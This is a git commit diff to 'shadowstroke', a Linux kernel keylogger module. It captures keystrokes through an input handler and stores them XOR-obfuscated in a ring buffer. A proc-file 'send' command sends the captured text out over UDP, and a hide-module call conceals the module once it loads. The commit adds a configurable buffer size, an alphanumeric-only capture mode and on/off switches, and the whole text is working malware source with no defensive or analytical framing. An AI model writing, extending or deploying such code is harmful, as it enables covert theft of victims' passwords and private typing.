54755bab01b59f8188bb0b9b88e996bf78a7dc86
Ubuntu <morning3tar@pm.me>
2025-05-10 16:13:51 +0000

    configurable logging Op

--- shadowstroke.c
+++ shadowstroke.c
@@ -23,7 +23,15 @@ static struct input_handler shadowstroke_input_handler;
 static struct proc_dir_entry *shadowstroke_proc_entry;
 static DEFINE_MUTEX(shadowstroke_buf_mutex);
 
-static char keystroke_buf[SHADOWSTROKE_BUF_SIZE];
+static int shadowstroke_buf_size = 4096;
+module_param(shadowstroke_buf_size, int, 0600);
+MODULE_PARM_DESC(shadowstroke_buf_size, "Keystroke buffer size");
+
+static char *log_mode = "all";
+module_param(log_mode, charp, 0600);
+MODULE_PARM_DESC(log_mode, "Logging mode: 'all' or 'alnum'");
+
+static char *keystroke_buf = NULL;
 static size_t buf_head = 0, buf_tail = 0;
 
 static char shadowstroke_xor_key = 0x5A; // default XOR key
@@ -68,16 +76,26 @@ static const char *keymap_shift[256] = {
 
 static bool shift_down = false, capslock_on = false;
 
-static void shadowstroke_log_char(const char *c)
+static bool logging_enabled = true;
+
+static bool is_alnum_key(unsigned int code) {
+    return (code >= KEY_A && code <= KEY_Z) || (code >= KEY_0 && code <= KEY_9);
+}
+
+static void shadowstroke_log_char(const char *c, unsigned int code)
 {
     size_t len = strlen(c);
     size_t i;
+    if (!logging_enabled)
+        return;
+    if (strcmp(log_mode, "alnum") == 0 && !is_alnum_key(code))
+        return;
     mutex_lock(&shadowstroke_buf_mutex);
     for (i = 0; i < len; ++i) {
         keystroke_buf[buf_head] = c[i] ^ shadowstroke_xor_key;
-        buf_head = (buf_head + 1) % SHADOWSTROKE_BUF_SIZE;
+        buf_head = (buf_head + 1) % shadowstroke_buf_size;
         if (buf_head == buf_tail) // buffer full, overwrite oldest
-            buf_tail = (buf_tail + 1) % SHADOWSTROKE_BUF_SIZE;
+            buf_tail = (buf_tail + 1) % shadowstroke_buf_size;
     }
     mutex_unlock(&shadowstroke_buf_mutex);
 }
@@ -109,7 +127,7 @@ static int shadowstroke_event(struct input_handle *handle, unsigned int type, un
             else
                 c = keymap[code];
             if (c && *c && shadowstroke_should_log())
-                shadowstroke_log_char(c);
+                shadowstroke_log_char(c, code);
         }
     }
     return 0;
@@ -207,53 +225,66 @@ static int shadowstroke_send_udp(const char *data, size_t len)
 static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
     ssize_t ret = 0;
-    size_t len = 0, i, j = 0;
-    char tmp[SHADOWSTROKE_BUF_SIZE];
-
+    size_t len = 0, i;
+    char *tmp;
+    tmp = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
+    if (!tmp)
+        return -ENOMEM;
     mutex_lock(&shadowstroke_buf_mutex);
     i = buf_tail;
-    while (i != buf_head && len < SHADOWSTROKE_BUF_SIZE - 1) {
-        tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key; // Decrypt
-        i = (i + 1) % SHADOWSTROKE_BUF_SIZE;
+    while (i != buf_head && len < shadowstroke_buf_size - 1) {
+        tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key;
+        i = (i + 1) % shadowstroke_buf_size;
     }
     tmp[len] = '\0';
     mutex_unlock(&shadowstroke_buf_mutex);
 
-    if (*ppos >= len)
+    if (*ppos >= len) {
+        kfree(tmp);
         return 0;
+    }
     if (count > len - *ppos)
         count = len - *ppos;
-    if (copy_to_user(buf, tmp + *ppos, count))
+    if (copy_to_user(buf, tmp + *ppos, count)) {
+        kfree(tmp);
         return -EFAULT;
+    }
     *ppos += count;
     ret = count;
+    kfree(tmp);
     return ret;
 }
 
 static ssize_t shadowstroke_proc_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
 {
-    char kbuf[16];
+    char kbuf[32];
     size_t to_copy = min(count, sizeof(kbuf) - 1);
     if (copy_from_user(kbuf, buf, to_copy))
         return -EFAULT;
     kbuf[to_copy] = '\0';
 
     if (strncmp(kbuf, "send", 4) == 0) {
-
-        char tmp[SHADOWSTROKE_BUF_SIZE];
+        char *tmp;
         size_t len = 0, i;
+        tmp = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
+        if (!tmp)
+            return -ENOMEM;
         mutex_lock(&shadowstroke_buf_mutex);
         i = buf_tail;
-        while (i != buf_head && len < SHADOWSTROKE_BUF_SIZE - 1) {
-            tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key; // Decrypt for exfil
-            i = (i + 1) % SHADOWSTROKE_BUF_SIZE;
+        while (i != buf_head && len < shadowstroke_buf_size - 1) {
+            tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key;
+            i = (i + 1) % shadowstroke_buf_size;
         }
         tmp[len] = '\0';
         mutex_unlock(&shadowstroke_buf_mutex);
         if (len > 0)
             shadowstroke_send_udp(tmp, len);
+        kfree(tmp);
+    } else if (strncmp(kbuf, "on", 2) == 0) {
+        logging_enabled = true;
+    } else if (strncmp(kbuf, "off", 3) == 0) {
+        logging_enabled = false;
     } else {
-
         mutex_lock(&shadowstroke_buf_mutex);
         buf_head = buf_tail = 0;
         mutex_unlock(&shadowstroke_buf_mutex);
@@ -268,7 +299,11 @@ static const struct proc_ops shadowstroke_proc_ops = {
 
 static int __init shadowstroke_init(void)
 {
-    int ret = input_register_handler(&shadowstroke_input_handler);
+    int ret;
+    keystroke_buf = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
+    if (!keystroke_buf)
+        return -ENOMEM;
+    ret = input_register_handler(&shadowstroke_input_handler);
     shadowstroke_proc_entry = proc_create("shadowstroke", 0440, NULL, &shadowstroke_proc_ops);
     shadowstroke_hide_module();
     printk(KERN_INFO "[ShadowStroke] Module loaded.\n");
@@ -279,6 +314,8 @@ static void __exit shadowstroke_exit(void)
 {
     if (shadowstroke_proc_entry)
         proc_remove(shadowstroke_proc_entry);
+    if (keystroke_buf)
+        kfree(keystroke_buf);
     input_unregister_handler(&shadowstroke_input_handler);
     printk(KERN_INFO "[ShadowStroke] Module unloaded.\n");
 }
